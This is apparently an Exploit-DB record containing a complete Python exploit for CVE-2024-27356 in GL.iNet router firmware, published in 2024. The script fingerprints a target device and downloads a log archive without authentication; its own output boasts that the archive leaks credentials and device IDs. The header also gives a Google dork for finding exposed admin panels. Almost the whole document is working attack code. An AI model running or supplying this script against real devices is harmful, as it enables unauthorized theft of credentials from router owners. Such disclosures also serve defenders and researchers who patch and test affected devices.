{"source": "https://www.exploit-db.com/exploits/51942", "vulnName": "GL-iNet MT6000 4.5.5 - Arbitrary File Download", "vulnEDBID": "51942", "vulnCVE": "2024-27356", "author": "BANDAR ALHARBI", "exploitType": "REMOTE", "platform": "HARDWARE", "datePublished": "2024-04-02", "vulnContent": "# Exploit Title: GL-iNet MT6000 4.5.5 - Arbitrary File Download\n# CVE: CVE-2024-27356\n# Google Dork: intitle:\"GL.iNet Admin Panel\"\n# Date: 2/26/2024\n# Exploit Author: Bandar Alharbi (aggressor)\n# Vendor Homepage: www.gl-inet.com\n# Tested Software Link: https://fw.gl-inet.com/firmware/x3000/release/openwrt-x3000-4.0-0406release1-0123-1705996441.bin\n# Tested Model: GL-X3000 Spitz AX\n# Affected Products and Firmware Versions: https://github.com/gl-inet/CVE-issues/blob/main/4.0.0/Download_file_vulnerability.md\n\nimport sys\nimport requests\nimport json\nrequests.packages.urllib3.disable_warnings()\nh = {'Content-type':'application/json;charset=utf-8', 'User-Agent':'Mozilla/5.0 (compatible;contxbot/1.0)'}\n\ndef DoesTarExist():\n    r = requests.get(url+\"/js/logread.tar\", verify=False, timeout=30, headers=h)\n    if r.status_code == 200:\n        f = open(\"logread.tar\", \"wb\")\n        f.write(r.content)\n        f.close()\n        print(\"[*] Full logs archive `logread.tar` has been downloaded!\")\n        print(\"[*] Do NOT forget to untar it and grep it! It leaks confidential info such as credentials, registered Device ID and a lot more!\")\n        return True\n    else:\n        print(\"[*] The `logread.tar` archive does not exist however ... try again later!\")\n        return False\n\ndef isVulnerable():\n    r1 = requests.post(url+\"/rpc\", verify=False, timeout=30, headers=h)\n    if r1.status_code == 500 and \"nginx\" in r1.text:\n        r2 = requests.get(url+\"/views/gl-sdk4-ui-login.common.js\", verify=False, timeout=30, headers=h)\n        if  \"Admin-Token\" in r2.text:\n            j  = {\"jsonrpc\":\"2.0\",\"id\":1,\"method\":\"call\",\"params\":[\"\",\"ui\",\"check_initialized\"]}\n            r3 = requests.post(url+\"/rpc\", verify=False, json=j, timeout=30, headers=h)\n            ver = r3.json()['result']['firmware_version']\n            model = r3.json()['result']['model']\n            if ver.startswith(('4.')):\n                print(\"[*] Firmware version (%s) is vulnerable!\" %ver)\n                print(\"[*] Device model is: %s\" %model)\n                return True\n    print(\"[*] Either the firmware version is not vulnerable or the target may not be a GL.iNet device!\")\n    return False\n\ndef isAlive():\n    try:\n        r = requests.get(url, verify=False, timeout=30, headers=h)\n        if r.status_code != 200:\n            print(\"[*] Make sure the target's web interface is accessible!\")\n            return False\n        elif r.status_code == 200:\n            print(\"[*] The target is reachable!\")\n            return True\n    except Exception:\n        print(\"[*] Error occurred when connecting to the target!\")\n        pass\n    return False\n\nif __name__ == '__main__':\n    if len(sys.argv) != 2:\n        print(\"exploit.py url\")\n        sys.exit(0)\n    url = sys.argv[1]\n    url = url.lower()\n    if not url.startswith(('http://', 'https://')):\n        print(\"[*] Invalid url format! It should be http[s]://<domain or ip>\")\n        sys.exit(0)\n    if url.endswith(\"/\"):\n        url = url.rstrip(\"/\")\n\n    print(\"[*] GL.iNet Unauthenticated Full Logs Downloader\")\n\n    try:\n        if (isAlive() and isVulnerable()) == (True and True):\n            DoesTarExist()\n    except KeyboardInterrupt:\n        print(\"[*] The exploit has been stopped by the user!\")\n        sys.exit(0)\n            "}